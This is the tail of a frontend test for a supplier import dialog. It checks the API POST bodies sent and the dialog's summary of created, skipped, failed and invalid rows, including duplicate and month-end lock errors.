      await user.click(within(review).getByRole("button", { name: "Import 3 rows" }));
      const finished = await screen.findByRole("dialog", { name: "Import finished" }, SLOW);

      const posts = requestsTo(recorded, "POST", `${API}/suppliers`).map((request) => jsonBody(request.init));
      expect(posts[0]).toEqual({
        code: "SUP-NEW1",
        name: "Northern Steel",
        category: "raw_materials",
        status: "on_hold",
        lead_time_days: 14,
        // The server dedupes on the address as sent, so the local part keeps its capitals.
        contact_email: "Rajesh.Pillai@meridian.example",
        since: "2024-03-04",
      });
      expect(posts.map((body) => body.code)).toEqual(["SUP-NEW1", "SUP-DUP", "SUP-LOCK"]);

      expect(stat(finished, "Created")).toBe("1");
      expect(stat(finished, "Skipped, already exist")).toBe("1");
      expect(stat(finished, "Failed")).toBe("1");
      expect(stat(finished, "Invalid")).toBe("1");
      const problems = within(finished).getByRole("table", { name: "Rows that were not created" });
      const duplicate = rowContaining(problems, "SUP-DUP").textContent ?? "";
      expect(duplicate).toMatch(/skipped/i);
      // The sentence once: the server repeats it as its one field error.
      expect(duplicate.match(/already exists/g)).toHaveLength(1);
      const refused = rowContaining(problems, "SUP-LOCK").textContent ?? "";
      expect(refused).toMatch(/failed/i);
      expect(refused).not.toMatch(/skipped/i);
      expect(refused).toContain("The supplier directory is closed while month-end runs");
      await waitFor(() => expect(onImported).toHaveBeenCalledTimes(1));
    },
    TEST_TIMEOUT,
  );
});
